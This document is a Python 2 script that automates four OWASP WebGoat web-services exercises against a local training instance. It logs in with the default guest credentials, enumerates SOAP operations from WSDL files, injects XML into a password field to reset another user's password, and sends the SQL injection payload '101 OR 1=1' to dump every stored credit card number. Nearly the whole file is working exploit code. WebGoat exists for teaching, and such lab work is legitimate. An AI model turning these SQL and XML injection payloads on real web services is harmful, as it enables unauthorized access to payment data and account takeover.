#!/usr/bin/python

# http://www.w3schools.com/tags/att_form_enctype.asp
# http://webappsecmovies.sourceforge.net/webgoat/#Web_Services
# http://stackoverflow.com/questions/5904969/python-how-to-print-a-dictionarys-key
# http://pywebsvcs.sourceforge.net/zsi.html

from ZSI.client import Binding, AUTH
import mechanize
from bs4 import BeautifulSoup

def exercise4():
	print "[+] WebGoat - Web Services Exercise 4 ...."
	binding = Binding(url="http://localhost:8080/WebGoat/services/WsSqlInjection")
	binding.SetAuth(AUTH.httpbasic, 'guest', 'guest')
	br = mechanize.Browser()
	br.add_password("http://localhost:8080/WebGoat/attack", 'guest', 'guest')
	br.open("http://localhost:8080/WebGoat/attack")
	br.select_form("form")
	br.submit()
	creditcards = getattr(binding, "getCreditCard")("101 OR 1=1")
#	print creditcards
	for number in creditcards["getCreditCardReturn"]:
		print "[*] Credit Card Number: " + number

def exercise3():
	print "[+] WebGoat - Web Services Exercise 3 ...."
	br = mechanize.Browser()
	br.add_password("http://localhost:8080/WebGoat/attack", 'guest', 'guest')
	br.open("http://localhost:8080/WebGoat/attack")
#	print br.response().read()
	br.select_form("form")
	br.submit()
#	print br
	request = br.click_link(text = "Web Service SAX Injection")
#	print request
	br.open(request)
#	print br.response().read()
	# how we know what the encode type is!
	for form in br.forms():
		print form
	br.select_form("form")
#	br.form['password'] = "test</password><id xsi:type='xsd:int'>101</id><password xsi:type='xsd:string'>iwin"
	br.form['password'] = "test</password><id xsi:type=\'xsd:int\'>\'101\'</id><password xsi:type=\'xsd:string\'>\'iwin"
	br.form.enctype = 'application/x-www-form-urlencoded'
#	br.form.enctype = 'text/plain'
	br.submit()
#	print br.response().read()
	html = br.response().read()

	soup = BeautifulSoup(html)
	a = soup.find_all('b')
	print "[*] " + a[4].text

def exercise2():
	print "[+] WebGoat - Web Services Exercise 2 ...."
	binding = Binding(url="http://localhost:8080/WebGoat/services/WSDLScanning")
	binding.SetAuth(AUTH.httpbasic, 'guest', 'guest')
	br = mechanize.Browser()
	br.add_password("http://localhost:8080/WebGoat/attack", 'guest', 'guest')
	br.open("http://localhost:8080/WebGoat/attack")
#	print br.response().read()
	br.select_form("form")
	br.submit()
	xml = br.open('http://localhost:8080/WebGoat/services/WSDLScanning?WSDL').read()
	soup = BeautifulSoup(xml, 'xml')
#	print br.response().read()
	port_type = soup.find('portType')
#	print port_type
	operations = []
	for operation in port_type.find_all('operation'):
#		print operation['name']
		operations.append(operation['name'])
#		print operations

	i = getattr(binding, operations[2])(102)
	print "[*] Credit Card Number: %s" % i['getCreditCardReturn']

def exercise1():
	print "[+] WebGoat - Web Services Exercise 1 ...."
	binding = Binding(url="http://localhost:8080/WebGoat/services/SoapRequest")
	binding.SetAuth(AUTH.httpbasic, 'guest', 'guest')
	br = mechanize.Browser()
	br.add_password("http://localhost:8080/WebGoat/attack", 'guest', 'guest')
	br.open("http://localhost:8080/WebGoat/attack")
#	print br.response().read()
	br.select_form("form")
	br.submit()
	xml = br.open('http://localhost:8080/WebGoat/services/SoapRequest?WSDL').read()
	soup = BeautifulSoup(xml, 'xml')
#	print br.response().read()
	port_type = soup.find('portType')
#	print port_type 
	for operation in port_type.find_all('operation'):
		print "[*] " + operation['name'] + ' : ' "%s" % getattr(binding, operation['name'])(102)

def main():
	exercise1()
	exercise2()
	exercise3()
	exercise4()

if __name__ == "__main__":
	main()
